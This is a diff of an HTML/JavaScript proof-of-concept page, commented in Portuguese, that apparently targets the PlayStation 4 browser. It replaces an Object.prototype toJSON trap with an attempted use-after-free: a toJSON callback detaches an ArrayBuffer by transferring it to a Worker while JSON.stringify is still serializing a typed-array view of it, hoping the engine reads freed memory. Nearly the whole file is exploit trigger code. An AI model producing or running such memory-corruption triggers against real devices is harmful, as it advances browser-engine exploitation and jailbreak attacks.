@@ -1,71 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 X-Ray Debug V2 (Object Target)</title>
+    <title>PS4 Buffer Detach PoC</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; font-size: 24px; }
-        #log { border: 1px solid #0f0; padding: 10px; }
-        .trap { color: #ff00ff; font-weight: bold; }
+        body { background: #200; color: #fff; font-family: monospace; padding: 20px; font-size: 24px; }
+        #log { border: 1px solid #f00; padding: 10px; }
     </style>
 </head>
 <body>
-    <h3>DEBUG V2: OBJECT TRAP</h3>
-    <div id="log">Inicializando...</div>
+    <h3>POC: BUFFER DETACH (UAF)</h3>
+    <div id="log">Iniciando...</div>
 
     <script>
         const logDiv = document.getElementById('log');
-        function log(msg, type='') {
+        function log(msg) {
             const div = document.createElement('div');
             div.innerText = msg;
-            if(type) div.className = type;
             logDiv.appendChild(div);
         }
 
-        async function runDebug() {
-            log("1. Preparando Vítimas...");
-            let victims = [];
-            for(let i=0; i<100; i++) victims.push({a: 1, b: 2});
+        async function runDetachExploit() {
+            log("1. Criando Vítima (TypedArray)...");
             
-            log("2. Instalando Armadilha em Object.prototype...");
+            // Cria um buffer de memória real
+            const buffer = new ArrayBuffer(1024 * 16); // 16KB
+            const view = new Uint32Array(buffer);
             
-            // CORREÇÃO: Usamos Object.prototype, que sabemos que funciona no seu PS4
-            Object.defineProperty(Object.prototype, "toJSON", {
-                get: function() {
-                    log(">>> ARMADILHA ATIVADA! CÓDIGO RODANDO! <<<", "trap");
-                    
-                    // O Ataque de Corrupção
-                    log("3. Tentando corromper memória...");
-                    victims.length = 0; // Esvazia array de referências
-                    
-                    // Spray pesado para forçar o crash se o motor estiver instável
-                    let junk = new ArrayBuffer(1024 * 1024);
-                    
-                    log("4. Retornando da armadilha...");
-                    return "pwned";
-                }
-            });
+            // Preenche com dados para o JSON ter o que ler
+            for(let i=0; i<view.length; i++) view[i] = 0x41414141;
+            
+            // O objeto que será serializado
+            // Colocamos o 'view' DEPOIS de um gatilho
+            const target = {
+                a: { 
+                    toJSON: () => {
+                        log(">>> ARMADILHA: DETACHING BUFFER! <<<");
+                        
+                        // AQUI É O GOLPE:
+                        // Transferimos o buffer para um worker.
+                        // Isso torna o buffer 'neutered' (tamanho 0, ponteiro nulo) na thread principal
+                        // Mas o JSON.stringify C++ talvez ainda tenha o ponteiro antigo.
+                        try {
+                            const worker = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
+                            worker.postMessage(buffer, [buffer]);
+                            worker.terminate();
+                            
+                            if (buffer.byteLength === 0) {
+                                log("SUCESSO: Buffer desconectado (Size: 0)!");
+                            } else {
+                                log("FALHA: Não conseguiu desconectar.");
+                            }
+                        } catch(e) {
+                            log("Erro no Detach: " + e.message);
+                        }
+                        
+                        return "trap_executed";
+                    }
+                },
+                b: view // O motor vai tentar ler isso LOGO APÓS a armadilha
+            };
 
-            log("5. Preparando Gatilho (Objeto)...");
-            // CORREÇÃO: Usamos um Objeto, não um número
-            let bait = [{ trigger: true }]; 
-            
-            await new Promise(r => setTimeout(r, 1000)); 
-            
-            log("6. DISPARANDO AGORA...");
-            
+            log("2. Disparando JSON.stringify...");
+            await new Promise(r => setTimeout(r, 500));
+
             try {
-                // Se o console congelar aqui (com a msg "ARMADILHA ATIVADA" na tela), 
-                // é vitória.
-                JSON.stringify(bait); 
-                log("7. Sobreviveu (O bug existe, mas não causou Deadlock)");
+                // Se o motor não checar se o buffer foi desconectado entre 'a' e 'b',
+                // ele vai ler memória morta -> CRASH.
+                JSON.stringify(target);
+                log("3. Sobreviveu (O motor checou o estado do buffer)");
             } catch(e) {
                 log("Erro capturado: " + e.message);
-            } finally {
-                delete Object.prototype.toJSON;
+                if (e.message.includes("detached") || e.name === "TypeError") {
+                    log("RESULTADO: O navegador bloqueou o acesso (Safe).");
+                }
             }
         }
 
-        setTimeout(runDebug, 1000);
+        setTimeout(runDetachExploit, 1000);
     </script>
 </body>
 </html>
